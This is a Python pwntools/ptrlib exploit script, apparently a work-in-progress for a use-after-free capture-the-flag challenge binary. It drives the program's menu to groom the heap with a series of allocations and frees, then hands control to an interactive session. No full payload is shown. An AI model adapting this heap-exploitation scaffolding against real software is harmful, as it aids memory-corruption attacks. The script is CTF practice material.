#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./uaf_overwrite_patched")
libc = ptr.ELF("./libc-2.27.so")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("localhost", 5000)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    def human(weight: int, age: int):
        io.sendlineafter(b"> ", "1")
        io.sendlineafter(b"Human Weight: ", str(weight))
        io.sendlineafter(b"Human Age: ", str(age))
        return

    def robot(weight: int):
        io.sendlineafter(b"> ", "2")
        io.sendlineafter(b"Robot Weight: ", str(weight))
        return

    def custom(size: int, data: bytes, free_idx: int):
        io.sendlineafter(b"> ", "3")
        io.sendlineafter(b"Size: ", str(size))
        io.sendlineafter(b"Data: ", data)
        io.sendlineafter(b"Free idx: ", str(free_idx))
        return

    # human();
    # input(">> ")
    # human(0x10, 0x10)
    custom(0x128, b"AAAA", 9)
    custom(0x128, b"AAAA", 9)
    custom(0x128, b"AAAA", 9)
    custom(0x128, b"AAAA", 9)

    custom(0x138, b"BBBB", 0)
    custom(0x138, b"CCCC", 1)
    custom(0x138, b"DDDD", 2)
    custom(0x138, b"EEEE", 1)
    io.interactive()
    return


if __name__ == "__main__":
    main()
